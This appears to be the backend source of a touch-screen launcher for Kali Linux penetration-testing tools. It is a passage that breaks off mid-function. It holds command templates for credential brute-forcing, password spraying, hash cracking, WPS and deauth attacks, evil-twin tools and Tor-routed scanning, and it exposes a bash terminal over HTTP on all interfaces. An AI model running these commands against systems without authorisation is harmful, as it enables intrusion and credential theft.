#!/usr/bin/env python3
"""Kali Touch UI - stdlib-only backend (no pip installs needed on the Pi)."""
import csv
import fcntl
import glob
import json
import os
import platform
import pty
import re
import select
import shlex
import shutil
import signal
import socket
import struct
import subprocess
import termios
import threading
import time
import webbrowser
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import urlparse, unquote

ROOT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "web")
ROOT = os.path.realpath(ROOT)
HOST = "0.0.0.0"
PORT = int(os.environ.get("TOUCHUI_PORT", "8080"))

# Tool registry: (section, label, command builder, needs-root, category)
TOOLS = [
    # Network scanning
    ("scan", "Nmap Quick", "nmap -Pn -T4 -oN - {target}", False),
    ("scan", "Nmap Syn Scan", "nmap -sS -Pn -T4 {target}", True),
    ("scan", "Nmap Full Ports", "nmap -p- -Pn {target}", False),
    ("scan", "Netdiscover", "netdiscover -r {target}", True),
    ("scan", "Masscan", "masscan {target} -p1-65535 --rate 1000", True),
    ("scan", "Arp Scan (arp-scan)", "arp-scan --localnet", True),
    ("recon", "Ping Sweep", "nmap -sn {target}", False),
    ("recon", "DNS Recon", "dnsrecon -d {target}", False),
    ("recon", "DNS Enum", "dnsenum {target}", False),
    ("recon", "WhatWeb", "whatweb -v {target}", False),
    ("recon", "theHarvester", "theHarvester -d {target} -b all", False),
    ("recon", "Nslookup", "nslookup {target}", False),
    # Web
    ("web", "sqlmap", "sqlmap -u {target} --batch --crawl 1", False),
    ("web", "Nikto", "nikto -h {target}", False),
    ("web", "DirBuster (dirb)", "dirb {target}", False),
    ("web", "Gobuster Dir", "gobuster dir -u {target} -w /usr/share/wordlists/dirb/common.txt", False),
    ("web", "Gobuster Vhost", "gobuster vhost -u {target} -w /usr/share/wordlists/dirb/common.txt", False),
    ("web", "FFUF", "ffuf -u {target}/FUZZ -w /usr/share/wordlists/dirb/common.txt", False),
    ("web", "WFuzz Dir", "wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt --hc 404 {target}/FUZZ", False),
    ("web", "WPScan", "wpscan --url {target} --no-banner", False),
    ("web", "WPScan Enumerate", "wpscan --url {target} --enumerate u,vp --no-banner", False),
    # Credential / brute (wordlist picks rockyou / SecLists automatically)
    ("auth", "Hydra SSH", "hydra -L /tmp/users.txt -P {wordlist} ssh://{target}", False),
    ("auth", "Hydra FTP", "hydra -L /tmp/users.txt -P {wordlist} ftp://{target}", False),
    ("auth", "Hydra MySQL", "hydra -L /tmp/users.txt -P {wordlist} mysql://{target}", False),
    ("auth", "Hydra RDP", "hydra -L /tmp/users.txt -P {wordlist} rdp://{target}", False),
    ("auth", "Hydra HTTP POST", "hydra -L /tmp/users.txt -P {wordlist} http-post-form \"{target}/login:user=^USER^&pass=^PASS^:F=incorrect\"", False),
    ("auth", "Ncrack RDP", "ncrack -p 3389 {target}", True),
    ("auth", "Medusa RDP", "medusa -h {target} -U /tmp/users.txt -P {wordlist} -M rdp -n 3389 -t 3", True),
    ("auth", "SMB Password Spray", "crackmapexec smb {target} -u /tmp/users.txt -p {pass}", True),
    # Wireless
    ("wireless", "airmon-ng start", "airmon-ng start {target}", True),
    ("wireless", "airodump-ng", "airodump-ng {target}", True),
    ("wireless", "aircrack-ng", "aircrack-ng {target}", False),
    ("wireless", "Reaver", "reaver -i {target} -b {bssid} -vv", True),
    # Bluetooth (bluez / bluez-utils)
    ("bt", "Bluetooth Device list", "bluetoothctl devices", False),
    ("bt", "Bluetooth Paired", "bluetoothctl paired-devices", False),
    ("bt", "Bluetooth Scan (classic)", "timeout 15 bluetoothctl scan on", True),
    ("bt", "BLE LeScan (advertising)", "timeout 15 hcitool lescan", True),
    ("bt", "L2ping target", "l2ping -c 4 {target}", True),
    ("bt", "Bluetooth iface info", "hciconfig -a && hcitool dev", True),
    ("bt", "SDP browse target", "sdptool browse {target}", True),
    # SMB / Windows
    ("smb", "Enum4linux", "enum4linux {target}", False),
    ("smb", "smbclient list", "smbclient -L //{target}", False),
    ("smb", "evil-winrm", "evil-winrm -i {target} -u {user} -p {pass}", False),
    # Misc
    ("util", "Tcpdump", "tcpdump -i {target} -nn", True),
    ("util", "Ping", "ping -c 4 {target}", False),
    ("util", "Traceroute", "traceroute {target}", True),
    ("util", "ip a", "ip a", False),
    ("util", "ss (ports)", "ss -tulpn", True),
    ("util", "whois", "whois {target}", False),
    ("util", "dig", "dig {target} any", False),
    ("util", "curl", "curl -sI {target}", False),
    ("util", "iwlist scan", "iwlist {target} scan", True),
    # Password cracking (rockyou / SecLists via {wordlist}, {hashmode})
    ("crack", "John Auto Detect", "john --wordlist={wordlist} {target}", False),
    ("crack", "John Single Mode", "john --single {target}", False),
    ("crack", "John Show Results", "john --show {target}", False),
    ("crack", "Hashcat Wordlist", "hashcat -m {hashmode} -a 0 {target} {wordlist}", False),
    ("crack", "Hashcat Mask", "hashcat -m {hashmode} -a 3 {target} ?a?a?a?a?a?a?a?a", False),
    ("crack", "Hashcat + Rule (best64)", "hashcat -m {hashmode} -a 0 {target} {wordlist} -r /usr/share/hashcat/rules/best64.rule", False),
    ("crack", "Hashcat Show Potfile", "hashcat -m {hashmode} --show {target}", False),
    ("crack", "Crunch Gen Wordlist", "crunch {target} 26 -o /tmp/crunch.txt", False),
    ("crack", "Hydra SSH (dict)", "hydra -L /tmp/users.txt -P {wordlist} ssh://{target}", False),
]

SECTIONS = [
    ("scan", "Network Scan", "radar"),
    ("recon", "Recon & DNS", "search"),
    ("web", "Web Attacks", "globe"),
    ("auth", "Brute Force", "key"),
    ("wireless", "WiFi Attacks", "wifi"),
    ("bt", "Bluetooth", "bt"),
    ("crack", "Password Crack", "lock"),
    ("smb", "SMB / Win", "shield"),
    ("util", "Utility", "tool"),
]

# Click-to-run tools: (id, group, label, icon, binary, needs-root, apt package)
INTERACTIVE = [
    ("wifite", "WiFi", "WiFite — auto attack", "✱", "wifite", True, "wifite"),
    ("airmon", "WiFi", "Airmon-ng — monitor mode", "✱", "airmon-ng", True, "aircrack-ng"),
    ("airodump", "WiFi", "Airodump-ng — handshake capture", "◉", "airodump-ng", True, "aircrack-ng"),
    ("aireplay", "WiFi", "Aireplay-ng — deauth/inject", "✱", "aireplay-ng", True, "aircrack-ng"),
    ("aircrack", "WiFi", "Aircrack-ng — crack handshake", "❋", "aircrack-ng", False, "aircrack-ng"),
    ("reaver", "WiFi", "Reaver — WPS attack", "❋", "reaver", True, "reaver"),
    ("bully", "WiFi", "Bully — WPS attack", "❋", "bully", True, "bully"),
    ("pixiewps", "WiFi", "PixieWPS", "❋", "pixiewps", False, "pixiewps"),
    ("hcxdumptool", "WiFi", "Hcxdumptool — PMKID/PMK sniff", "◉", "hcxdumptool", True, "hcxtools"),
    ("hcxpcapngtool", "WiFi", "Hcxpcaptool — convert to hash", "❋", "hcxpcapngtool", False, "hcxtools"),
    ("wifiphisher", "WiFi", "Wifiphisher — evil twin", "⚑", "wifiphisher", True, "wifiphisher"),
    ("airgeddon", "WiFi", "Airgeddon — multi attack", "⚑", "airgeddon", True, "airgeddon"),
    ("kismet", "WiFi", "Kismet — wardriving", "◉", "kismet", True, "kismet"),
    ("macchanger", "WiFi", "Macchanger — spoof MAC", "⚒", "macchanger", True, "macchanger"),
    ("bettercap", "BLE", "Bettercap — BLE / MITM", "◆", "bettercap", True, "bettercap"),
    ("bluetoothctl", "BLE", "Bluetoothctl", "◉", "bluetoothctl", False, "bluez"),
    ("btmon", "BLE", "Btmon — BLE sniffer", "◉", "btmon", True, "bluez"),
    ("hciconfig", "BLE", "Hciconfig", "◉", "hciconfig", True, "bluez"),
    ("nmap", "Net", "Nmap", "◎", "nmap", False, "nmap"),
    ("tcpdump", "Net", "Tcpdump — packet capture", "◉", "tcpdump", True, "tcpdump"),
    ("tshark", "Net", "Tshark — Wireshark CLI", "◉", "tshark", False, "tshark"),
    ("ncat", "Net", "Ncat", "◆", "ncat", False, "nmap"),
    ("responder", "Net", "Responder — LLMNR/NBT", "◆", "responder", True, "responder"),
    ("netexec", "Net", "Netexec (crackmapexec)", "◆", "netexec", True, "netexec"),
    ("evil-winrm", "Net", "Evil-WinRM", "◆", "evil-winrm", False, "evil-winrm"),
    ("smbclient", "Net", "Smbclient", "◆", "smbclient", False, "smbclient"),
    ("msfconsole", "Net", "Metasploit", "⚑", "msfconsole", False, "metasploit-framework"),
    ("sqlmap", "Web", "Sqlmap", "◎", "sqlmap", False, "sqlmap"),
    ("gobuster", "Web", "Gobuster", "◎", "gobuster", False, "gobuster"),
    ("nikto", "Web", "Nikto", "◎", "nikto", False, "nikto"),
    ("wpscan", "Web", "WPScan", "◎", "wpscan", False, "wpscan"),
    ("theharvester", "Web", "theHarvester — OSINT", "◎", "theHarvester", False, "theharvester"),
    ("hydra", "Auth", "Hydra — brute force", "❋", "hydra", False, "hydra"),
    ("medusa", "Auth", "Medusa — brute force", "❋", "medusa", False, "medusa"),
    ("ncrack", "Auth", "Ncrack — brute force", "❋", "ncrack", False, "ncrack"),
    ("hashid", "Crack", "Hashid — identify hashes", "❋", "hashid", False, "hashid"),
    ("hashcat", "Crack", "Hashcat", "❋", "hashcat", False, "hashcat"),
    ("john", "Crack", "John the Ripper", "❋", "john", False, "john"),
    ("crunch", "Crack", "Crunch — gen wordlist", "❋", "crunch", False, "crunch"),
    ("exiftool", "Crack", "ExifTool — metadata", "❋", "exiftool", False, "libimage-exiftool-perl"),
]

LAUNCH_GROUPS = ["WiFi", "BLE", "Net", "Web", "Auth", "Crack"]

# Binary -> Debian package for TOOLS entries whose package name != first token.
PACKAGE_FOR = {
    "theHarvester": "theharvester",
    "dig": "dnsutils",
    "iwlist": "wireless-tools",
    "airmon-ng": "aircrack-ng",
    "airodump-ng": "aircrack-ng",
    "aireplay-ng": "aircrack-ng",
    "aircrack-ng": "aircrack-ng",
    "hcitool": "bluez",
    "hciconfig": "bluez",
    "sdptool": "bluez",
    "l2ping": "bluez",
    "bluetoothctl": "bluez",
}


def tool_bin(cmd):
    try:
        return shlex.split(cmd)[0]
    except (ValueError, IndexError):
        return ""


def tool_pkg(cmd):
    b = tool_bin(cmd)
    return PACKAGE_FOR.get(b, b.lower()) if b else ""

INSTALL_LOG = "/tmp/kali-ui-install.log"
APT_LOG = "/tmp/kali-ui-apt.log"
APT_PROC = None

SAFE_PATTERNS = re.compile(r"^[A-Za-z0-9._:/:\[\]-]+$")
bssid = ""

# Default wordlists to prefer for password attacks (rockyou / SecLists).
DEFAULT_WORDLISTS = [
    "/usr/share/wordlists/rockyou.txt",
    "/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt",
    "/usr/share/seclists/Passwords/Common-Credentials/rockyou-75.txt",
    "/usr/share/john/password.lst",
    "/usr/share/wordlists/metasploit/default_pass_for_services_unhash.txt",
]


def _scan_wordlists(base, max_depth=1, cap=80):
    res = []
    if not os.path.isdir(base):
        return res

    def walk(d, depth):
        if len(res) >= cap:
            return
        try:
            entries = sorted(os.listdir(d))
        except OSError:
            return
        for ent in entries:
            p = os.path.join(d, ent)
            if os.path.isfile(p) and ent.endswith(".txt") and os.path.getsize(p) > 0 and " " not in ent:
                res.append((p, ent))
            elif os.path.isdir(p) and depth < max_depth and not ent.startswith("."):
                walk(p, depth + 1)
            if len(res) >= cap:
                return

    walk(base, 0)
    return res


def find_wordlists():
    """Return available dictionary files for the UI picker."""
    paths = []
    paths += _scan_wordlists("/usr/share/wordlists")
    paths += _scan_wordlists("/usr/share/seclists", max_depth=2, cap=100)
    paths += _scan_wordlists("/usr/share/john")
    for p in DEFAULT_WORDLISTS:
        if os.path.isfile(p) and all(p != x[0] for x in paths):
            paths.append((p, os.path.basename(p)))
    if not paths:
        paths.append((DEFAULT_WORDLISTS[0], "rockyou.txt"))
    seen = set()
    out = []
    for p, name in paths:
        if p not in seen:
            seen.add(p)
            try:
                size = os.path.getsize(p)
            except OSError:
                size = 0
            out.append({"path": p, "name": name, "size": size})
    return out


def default_wordlist():
    for p in DEFAULT_WORDLISTS:
        if os.path.isfile(p):
            return p
    lists = [w["path"] for w in find_wordlists()]
    return lists[0] if lists else "/usr/share/wordlists/rockyou.txt"


DEFAULT_USERS = ["root", "admin", "administrator", "user", "guest", "kali",
                 "test", "oracle", "pi", "ubuntu", "support", "manager"]


def ensure_users_file():
    if not os.path.exists("/tmp/users.txt"):
        with open("/tmp/users.txt", "w") as f:
            f.write("\n".join(DEFAULT_USERS) + "\n")


# ---------------------------------------------------------------
# WiFi + system settings helpers
# ---------------------------------------------------------------

def _run(cmd, timeout=10):
    """Run a command and return (code, stdout). Never uses a shell."""
    try:
        p = subprocess.run(
            shlex.split(cmd),
            capture_output=True,
            text=True,
            timeout=timeout,
        )
        return p.returncode, p.stdout
    except Exception as e:
        return -1, str(e)


def _run_args(args, timeout=10):
    """Like _run but takes a pre-split argv list (safe for names with spaces)."""
    try:
        p = subprocess.run(
            list(args),
            capture_output=True,
            text=True,
            timeout=timeout,
        )
        return p.returncode, p.stdout + p.stderr
    except Exception as e:
        return -1, str(e)


def _wifi_iface():
    rc, out = _run("iw dev")
    for line in out.splitlines():
        line = line.strip()
        if line.startswith("Interface"):
            return line.split()[-1]
    # prefer a wireless interface from /sys/class/net
    try:
        for name in os.listdir("/sys/class/net"):
            wpath = "/sys/class/net/%s/wireless" % name
            if os.path.isdir(wpath):
                return name
    except OSError:
        pass
    return None


def _ipv4():
    ip = None
    try:
        host = socket.gethostname()
        for addr in socket.getaddrinfo(host, None, socket.AF_INET):
            ip = addr[4][0]
            if not ip.startswith("127."):
                break
    except Exception:
        pass
    if not ip or ip.startswith("127."):
        try:
            rc, out = _run("ip -4 addr show scope global")
            import re as _re
            m = _re.search(r"inet\s+([0-9.]+)", out)
            if m:
                ip = m.group(1)
        except Exception:
            pass
    return ip or ""


def sysinfo():
    info = get_network_info()
    I = info.get("wifi_iface")
    if I and I != "none detected":
        rc, out = _run("iw dev %s link" % I)
        for m in re.finditer(r"SSID: (.+)", out):
            info["ssid"] = m.group(1).strip()
            break
    else:
        info["ssid"] = ""
    info.setdefault("ssid", "")
    rc, out = _run("vcgencmd measure_temp")
    info["temp"] = ""
    if rc == 0:
        m = re.search(r"[0-9.]+", out)
        if m:
            info["temp"] = m.group(0)
    try:
        with open("/proc/loadavg") as f:
            info["load"] = f.read().split()[0]
    except IOError:
        info["load"] = ""
    try:
        with open("/proc/meminfo") as f:
            tot = av = 0
            for line in f:
                parts = line.split()
                if parts[0] == "MemTotal:":
                    tot = int(parts[1])
                elif parts[0] == "MemAvailable:":
                    av = int(parts[1])
            info["mem"] = "%d%%" % (100 * (tot - av) // tot) if tot else ""
    except IOError:
        info["mem"] = ""
    return info


def get_network_info():
    info = {
        "hostname": socket.gethostname(),
        "os": "Kali Linux " + platform.release(),
        "ip": _ipv4(),
        "kernel": platform.release(),
        "arch": platform.machine(),
        "uptime": "",
    }
    rc, out = _run("uptime -p")
    if rc == 0:
        info["uptime"] = out.strip()
    # ip link shows which interfaces have a carrier / are up
    iface = _wifi_iface()
    info["wifi_iface"] = iface if iface else "none detected"
    return info


def parse_iwlist_scan(out):
    """Parse `iwlist <iface> scan` output into a list of network dicts."""
    nets = []
    cur = None

    def flush():
        pass

    def push():
        nonlocal cur
        if cur and cur.get("essid") is not None and cur["essid"] != "":
            nets.append(cur)
        cur = None

    for line in out.splitlines():
        line = line.strip()
        if line.startswith("Cell") or line.startswith("BSS"):
            push()
            cur = {"essid": None, "bssid": None, "quality": 0.0, "signal": None, "enc": "Open", "channel": None}
            m = re.search(r"Address: ([0-9A-Fa-f:]+)", line)
            if m:
                cur["bssid"] = m.group(1).upper()
            continue
        if cur is None:
            continue
        low = line.lower()
        if "essid:" in low:
            essid = line.split(":", 1)[1].strip().strip('"')
            cur["essid"] = essid
        elif "freq:" in low:
            m = re.search(r"Channel\s*([0-9]+)", line)
            if m:
                cur["channel"] = m.group(1)
        elif "signal level" in low or "level=" in low:
            m = re.search(r"(-?[0-9]+)\s*dBm", line)
            if m:
                cur["signal"] = m.group(1)
                cur["quality"] = max(0, min(1, (int(m.group(1)) + 100) / 60.0))
        elif "encryption key" in low:
            if "on" in low:
                cur["enc"] = "WPA/WPA2"
            else:
                cur["enc"] = "Open"
        elif "ie:" in low and "wpa" in low and cur["enc"] != "Open":
            pass
    push()
    return nets


def scan_wifi():
    iface = _wifi_iface()
    if not iface:
        return {"networks": [], "error": "no wireless interface found"}
    rc, out = _run("sudo iwlist %s scan" % iface, timeout=30)
    if rc != 0:
        fallback = _run("sudo iw dev %s scan" % iface, timeout=30)
        if fallback[0] == 0:
            out = fallback[1]
        else:
            return {"networks": [], "error": out.strip() or "scan failed (exit %d)" % rc}
    nets = parse_iwlist_scan(out)
    # stable ordering: strongest signal first
    nets.sort(key=lambda n: n["quality"], reverse=True)
    return {"networks": nets, "iface": iface}


def connect_wifi(ssid, password=None):
    ssid = (ssid or "").strip()
    if not ssid:
        return {"ok": False, "error": "no SSID provided"}
    iface = _wifi_iface() or "wlan0"

    # Prefer NetworkManager: connection profiles are saved persistently,
    # so the device reconnects to this network automatically on reboot.
    rc, _ = _run("systemctl is-active NetworkManager")
    if rc == 0:
        res = _nm_connect(ssid, password, iface)
        if res.get("ok"):
            return res
        if res.get("fatal"):
            return res
        # otherwise fall through to wpa_supplicant as a fallback

    # bring interface up, kill existing connections
    _run("sudo ip link set %s up" % iface)
    _run("sudo wpa_cli -i %s disconnect" % iface)
    time.sleep(0.5)

    conf = "/tmp/kali-touch-wpa.conf"
    body = 'ctrl_interface=/run/wpa_supplicant\nnetwork={\n    ssid="%s"\n' % ssid
    if password:
        escaped = password.replace('"', '\\"').replace("\\", "\\\\")
        body += '    psk="%s"\n' % escaped
    else:
        body += "    key_mgmt=NONE\n"
    body += "}\n"
    try:
        with open(conf, "w") as f:
            f.write(body)
    except OSError as e:
        return {"ok": False, "error": "cannot write wpa config: %s" % e}

    cmd = "sudo wpa_supplicant -B -i %s -c %s" % (iface, conf)
    rc, err = _run(cmd, timeout=15)
    if rc != 0:
        return {"ok": False, "error": err.strip() or ("wpa_supplicant failed (%d)" % rc)}

    # wait for association + dhcp
    connected = False
    for _ in range(15):
        time.sleep(1)
        r = _run("sudo wpa_cli -i %s status" % iface)
        if r[0] == 0 and "STATE=COMPLETED" in r[1]:
            connected = True
            break
    if not connected:
        _run("sudo wpa_cli -i %s disconnect" % iface)
        return {"ok": False, "error": "could not associate with %s" % ssid}

    rc2 = _run("sudo dhclient -r %s" % iface)
    _run("sudo dhclient -v %s" % iface, timeout=20)
    return {"ok": True, "ssid": ssid, "ip": _ipv4(), "persistent": False}


def _nm_connect(ssid, password, iface):
    """Connect via NetworkManager. Persists the connection profile on disk."""
    _run_args(["sudo", "nmcli", "radio", "wifi", "on"])
    _run_args(["sudo", "nmcli", "dev", "wifi", "rescan"])
    time.sleep(1)
    args = ["sudo", "nmcli", "-w", "40", "dev", "wifi", "connect", ssid]
    if password:
        args += ["password", password]
    rc, err = _run_args(args, timeout=60)
    if rc != 0:
        msg = (err or "").strip().splitlines()
        msg = msg[-1] if msg else "nmcli connect failed"
        # wrong/unsupported psk or auth failures are not "no NetworkManager"
        fatal = any(k in (err or "") for k in ("password", "authentication", "secrets", "invalid"))
        return {"ok": False, "error": msg, "fatal": fatal}
    # wait for an IP
    ip = ""
    for _ in range(15):
        time.sleep(1)
        ip = _ipv4()
        if ip and not ip.startswith("169.254"):
            break
    return {"ok": True, "ssid": ssid, "ip": ip, "persistent": True}


def reboot_device():
    _run("sudo systemctl reboot", timeout=2)
    time.sleep(0.3)
    return {"ok": True}


def shutdown_device():
    _run("sudo systemctl poweroff", timeout=2)
    time.sleep(0.3)
    return {"ok": True}


def sanitize(value):
    value = (value or "").strip().replace(" ", "")
    if not value or not SAFE_PATTERNS.match(value):
        raise ValueError("Unsafe characters in input")
    return value


def find_tool(section, label):
    label = (label or "").strip()
    for s, l, c, r in TOOLS:
        if s == section and l == label:
            return (c, r)
    return None


def _ensure_tor():
    """Bring the tor service up if the route-through-Tor toggle is on."""
    rc, _ = _ota_sh("systemctl is-active tor 2>/dev/null", 10)
    if rc != 0:
        _ota_sh("systemctl start tor", 20)


def _proxychains_bin():
    return shutil.which("proxychains4") or shutil.which("proxychains") or ""


def build_cmd(params):
    section = sanitize(params.get("section", "util"))
    label = params.get("label", "")
    found = find_tool(section, label)
    if not found:
        raise ValueError("Unknown tool")
    cmd, needs_root = found
    if "{target}" in cmd:
        cmd = cmd.replace("{target}", sanitize(params.get("target")))
    if "{bssid}" in cmd:
        cmd = cmd.replace("{bssid}", sanitize(params.get("bssid", bssid)))
    if "{user}" in cmd:
        cmd = cmd.replace("{user}", sanitize(params.get("user", "admin")))
    if "{pass}" in cmd:
        cmd = cmd.replace("{pass}", sanitize(params.get("pass", "password")))
    if "{wordlist}" in cmd:
        chosen = (params.get("wordlist") or "").strip()
        wl = chosen if chosen else default_wordlist()
        cmd = cmd.replace("{wordlist}", sanitize(wl))
    if "{hashmode}" in cmd:
        hm = (params.get("hashmode") or "0").strip()
        cmd = cmd.replace("{hashmode}", sanitize(hm or "0"))
    if needs_root:
        cmd = "sudo " + cmd
    if params.get("tor") and params.get("target"):
        pc = _proxychains_bin()
        if not pc:
            raise ValueError("Tor routing needs proxychains — tap Install (proxychains4)")
        _ensure_tor()
        cmd = ("sudo %s " % pc + cmd[len("sudo "):]) if needs_root else "%s %s" % (pc, cmd)
    return cmd


class SSEManager:
    def __init__(self):
        self.queue = []
        self.lock = threading.Lock()
        self.proc = None

    def start(self, command):
        with self.lock:
            self.queue = []
        print(f"[run] {command}")
        self.proc = subprocess.Popen(
            shlex.split(command),
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1,
            env=dict(os.environ, PYTHONUNBUFFERED="1"),
        )

    def stop(self):
        if self.proc:
            self.proc.terminate()

    def poll(self):
        with self.lock:
            out = self.queue
            self.queue = []
        return out


SSE = SSEManager()


class TermManager:
    """Interactive bash session on a PTY. Output is pushed to a queue
    drained by the /sse/term endpoint; input comes in via POST."""

    MAX_QUEUE = 400

    def __init__(self):
        self.fd = None
        self.pid = None
        self.queue = []
        self.lock = threading.Lock()
        self.exited = True

    def start(self, shell="/bin/bash", init_cmd=None, cwd=None):
        if not self.exited and self.fd is not None:
            self.stop()
        try:
            home = cwd or (os.path.expanduser("~") or "/")
        except OSError:
            home = "/"
        self.pid, self.fd = pty.fork()
        if self.pid == 0:  # child — becomes an interactive shell
            # The backend may have been launched via nohup/& with SIGINT at
            # SIG_IGN; interactive bash then leaves SIGINT ignored for its
            # children, so ^C from the pty would never interrupt commands.
            # Reset dispositions before exec'ing the shell.
            for sig in (signal.SIGINT, signal.SIGQUIT, signal.SIGTSTP, signal.SIGTTIN, signal.SIGTTOU):
                try:
                    signal.signal(sig, signal.SIG_DFL)
                except (ValueError, OSError):
                    pass
            os.chdir(home)
            os.environ["TERM"] = "xterm-256color"
            os.environ["COLUMNS"] = "72"
            os.environ["LINES"] = "30"
            os.execvp(shell, [shell])
        try:
            fcntl.ioctl(self.fd, termios.TIOCSWINSZ, struct.pack("HHHH", 30, 72, 0, 0))
        except OSError:
            pass
        self.exited = False
        banner = "Kali Touch Terminal - type 'exit' to close, Ctrl+C to interrupt.\r\n\r\n"
        if init_cmd:
            banner = f"▶ running: {init_cmd}\r\n\r\n"
        with self.lock:
            self.queue = [banner.encode()]
        threading.Thread(target=self._reader, daemon=True).start()
        if init_cmd:
            threading.Thread(target=self._prime, args=(init_cmd,), daemon=True).start()
        return True

    def _prime(self, cmd):
        time.sleep(0.6)
        if not self.exited and self.fd is not None:
            try:
                os.write(self.fd, (cmd.rstrip("\r") + "\r").encode("utf-8"))
            except OSError:
                pass

    def _reader(self):
        while not self.exited and self.fd is not None:
            r, _, _ = select.select([self.fd], [], [], 0.1)
            if not r:
                continue
            try:
                data = os.read(self.fd, 4096)
            except OSError:
                self._mark_exit()
                break
            if not data:
                self._mark_exit()
                break
            with self.lock:
                self.queue.append(data)
                if len(self.queue) > self.MAX_QUEUE:
                    del self.queue[: len(self.queue) - self.MAX_QUEUE]
        # reap the child so we don't leave a zombie
        if self.pid:
            try:
                os.waitpid(self.pid, os.WNOHANG)
            except OSError:
                pass

    def _mark_exit(self):
        self.exited = True
        with self.lock:
            if not self.queue or b"[EXITED]" not in self.queue[-1]:
                self.queue.append(b"\r\n[SESSION EXITED - press restart to open a new shell]\r\n")

    def write(self, data):
        if self.fd is None or self.exited:
            return False
        try:
            os.write(self.fd, data.encode("utf-8"))
            return True
        except OSError:
            return False

    def stop(self):
        self.exited = True
        if self.pid:
            try:
                os.kill(self.pid, 9)
            except OSError:
                pass
            try:
                os.waitpid(self.pid, os.WNOHANG)
            except OSError:
                pass
        if self.fd is not None:
            try:
                os.close(self.fd)
            except OSError:
                pass
        self.fd = None

    def poll(self):
        with self.lock:
            out = self.queue
            self.queue = []
        return out


TERM = TermManager()


RECON_DIR = "/tmp/recon"


def parse_recon_csv(path):
    """Parse airodump-ng CSV into {aps, clients} (PineAP-recon style)."""
    aps, clients = [], []
    try:
        with open(path, newline="", encoding="utf-8", errors="replace") as f:
            rows = list(csv.reader(f))
    except OSError:
        return {"aps": aps, "clients": clients}
    section = 0
    headers = None
    for r in rows:
        if not r:
            continue
        first = (r[0].strip() if r else "")
        if first.startswith("BSSID") and "channel" in [c.strip().lower() for c in r]:
            headers = r
            section = 1
            continue
        if first.startswith("Station MAC"):
            headers = r
            section = 2
            continue
        if section == 0 or len(r) < len(headers or []):
            continue
        try:
            if section == 1:
                bssid = (r[0] or "").strip()
                if len(bssid) < 12:
                    continue
                aps.append({
                    "bssid": bssid,
                    "first": r[1].strip(), "last": r[2].strip(),
                    "channel": r[3].strip(), "speed": r[4].strip(),
                    "privacy": r[5].strip(), "cipher": r[6].strip(),
                    "auth": r[7].strip(), "power": r[8].strip(),
                    "beacons": r[9].strip(), "iv": r[10].strip(),
                    "lanip": r[11].strip(),
                    "essid": r[13].strip() if len(r) > 13 else "",
                    "key": r[14].strip() if len(r) > 14 else "",
                })
            elif section == 2 and len(r) > 5:
                clients.append({
                    "station": (r[0] or "").strip(),
                    "first": (r[1] or "").strip(), "last": (r[2] or "").strip(),
                    "power": (r[3] or "").strip(), "packets": (r[4] or "").strip(),
                    "bssid": (r[5] or "").strip(),
                    "probes": (r[6] or "").strip() if len(r) > 6 else "",
                })
        except IndexError:
            continue
    return {"aps": aps, "clients": clients}


class ReconManager:
    """PineAP-recon style scanner: airodump-ng in monitor mode with a live
    AP/client table and a rolling scan log."""

    def __init__(self):
        self.proc = None
        self.iface = None

    def running(self):
        return self.proc is not None and self.proc.poll() is None

    def available_iface(self, requested=None):
        def ok(ifc):
            if not ifc:
                return None
            r = subprocess.run(["sudo", "-n", "iw", "dev", ifc, "info"],
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            return ifc if r.returncode == 0 else None

        def rank(ifc):
            if ifc == "toolwlan0":
                return 0
            if ifc.startswith("wl") and ifc != "wlan0":
                return 1
            return 2

        if requested:
            found = ok(requested)
            if found:
                return found
        sniff = []
        try:
            for entry in os.listdir("/sys/class/net"):
                if os.path.isdir("/sys/class/net/%s/wireless" % entry) \
                        and not re.match(r"p2p", entry, re.I):
                    sniff.append(entry)
        except OSError:
            pass
        if not sniff:
            try:
                out = subprocess.run(["iw", "dev"], capture_output=True,
                                     text=True, timeout=5).stdout
                sniff = [m for m in re.findall(r"Interface\s+(\S+)", out)
                         if not re.match(r"p2p", m, re.I)]
            except (OSError, subprocess.TimeoutExpired):
                pass
        for ifc in sorted(set(sniff), key=rank):
            name = ok(ifc)
            if name and name != "wlan0" and name != "p2p-dev-wlan0":
                return name
        for ifc in ["toolwlan0", "mon0", "wlan1"]:
            name = ok(ifc)
            if name:
                return name
        return None

    def usb_hint(self):
        try:
            out = subprocess.run(["lsusb"], capture_output=True, text=True,
                                 timeout=5).stdout or ""
        except OSError:
            return ", replug the Alpha adapter"
        if "0bda:0811" in out or "0bda:8812" in out:
            return " (Alpha on USB but no usable interface — replug it)"
        return " (Alpha adapter not detected on USB — replug it)"

    def _monitor(self, iface):
        for a in (["ip", "link", "set", iface, "down"],
                  ["iw", "dev", iface, "set", "type", "monitor"],
                  ["ip", "link", "set", iface, "up"]):
            subprocess.run(["sudo", "-n"] + a, stdout=subprocess.DEVNULL,
                           stderr=subprocess.DEVNULL)
        return subprocess.run(["iw", "dev", iface, "info"], stdout=subprocess.DEVNULL,
                              stderr=subprocess.DEVNULL).returncode == 0

    def start(self, iface=None):
        HS.stop(crack=False)
        iface = self.available_iface(iface)
        if not iface:
            return False, "no wireless card" + self.usb_hint()
        self.stop()
        if not self._monitor(iface):
            self.stop()
            return False, "could not bring %s to monitor mode" % iface
        try:
            os.makedirs(RECON_DIR, exist_ok=True)
        except OSError:
            pass
        for f in glob.glob(RECON_DIR + "-*.csv"):
            try:
                os.remove(f)
            except OSError:
                pass
        log = open(RECON_DIR + "/scan.log", "wb")
        self.proc = subprocess.Popen(
            ["sudo", "-n", "airodump-ng", "--band", "abg", "--write", RECON_DIR,
             "--write-interval", "2", "--output-format", "csv", iface],
            stdout=log, stderr=subprocess.STDOUT)
        self.iface = iface
        return True, iface

    def stop(self):
        if self.proc is not None:
            try:
                self.proc.terminate()
                self.proc.wait(5)
            except (subprocess.TimeoutExpired, OSError):
                try:
                    self.proc.kill()
                except OSError:
                    pass
            self.proc = None

    def state(self):
        aps = clients = 0
        if self.running():
            d = self.data()
            aps, clients = len(d["aps"]), len(d["clients"])
        return {"running": self.running(), "iface": self.iface,
                "aps": aps, "clients": clients}

    def data(self):
        cands = sorted(glob.glob(RECON_DIR + "-*.csv"))
